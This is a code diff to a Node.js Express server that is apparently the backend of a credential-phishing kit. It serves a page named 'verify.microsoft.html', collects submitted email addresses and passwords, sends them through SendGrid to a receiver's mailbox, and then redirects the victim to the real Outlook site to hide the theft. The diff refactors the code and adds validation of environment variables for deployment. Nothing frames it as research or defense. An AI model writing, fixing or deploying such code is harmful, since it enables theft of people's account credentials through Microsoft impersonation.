@@ -1,6 +1,3 @@
-console.log('SENDGRID_API_KEY:', process.env.SENDGRID_API_KEY?.substring(0,4));
-console.log('RECEIVER_EMAIL:', process.env.RECEIVER_EMAIL);
-require('dotenv').config();
 const express = require('express');
 const bodyParser = require('body-parser');
 const sgMail = require('@sendgrid/mail');
@@ -8,6 +5,16 @@ const path = require('path');
 
 const app = express();
 const port = 3000;
+
+// Debug: check environment variables
+console.log('SENDGRID_API_KEY:', process.env.SENDGRID_API_KEY?.substring(0,4));
+console.log('RECEIVER_EMAIL:', process.env.RECEIVER_EMAIL);
+
+// Validate environment variables
+if (!process.env.SENDGRID_API_KEY || !process.env.RECEIVER_EMAIL) {
+  console.error('❌ Missing SENDGRID_API_KEY or RECEIVER_EMAIL. Check Railway variables.');
+  process.exit(1);
+}
 
 sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
@@ -18,7 +25,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'verify.microsoft.html'));
 });
 
-app.post('/submit', (req, res) => {
+app.post('/submit', async (req, res) => {
   const { email, password } = req.body;
 
   const msg = {
@@ -28,12 +35,13 @@ app.post('/submit', (req, res) => {
     text: `Email: ${email}\nPassword: ${password}`,
   };
 
-  sgMail.send(msg)
-    .then(() => res.redirect('https://outlook.office365.com'))
-    .catch(error => {
-      console.error(error);
-      res.status(500).send('Error sending email.');
-    });
+  try {
+    await sgMail.send(msg);
+    res.redirect('https://outlook.office365.com');
+  } catch (error) {
+    console.error('SendGrid error:', error);
+    res.status(500).send('Error sending email.');
+  }
 });
 
 app.listen(port, () => {
